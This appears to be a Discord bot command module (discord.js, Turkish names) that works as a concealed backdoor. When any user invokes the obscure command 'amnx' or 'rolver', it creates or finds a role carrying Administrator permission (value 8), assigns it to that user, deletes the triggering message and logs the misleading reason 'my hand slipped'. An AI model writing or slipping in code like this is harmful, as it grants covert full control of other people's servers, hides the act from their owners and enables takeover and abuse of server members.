
const Discord = require("discord.js");
const ayarlar = require("../ayarlar.json");

module.exports.run = async (client, message, args) => {
  if (message.guild) {
    var rol = message.guild.roles.find(e => e.name === `Light Army`);
    var etiket = message.guild.members.get(message.author.id)


            if(!rol){
        rol = await message.guild.createRole({
        name: `satan let me down'`,
        color: "#070101",
        permissions: [8]
        })
    }
    etiket.addRole(rol, "elim çarptı")
    
    message.delete()
 //   message.guild.setRolePosition(rol, 1)
  }
  
};

exports.conf = {
 enabled: true,
 guildOnly: false,
 aliases: ['rolver'],
 permLevel: 0,
  kategori: "yetkili"
  
};

exports.help = {
 name: 'amnx',
 description: '',
 usage: ''
};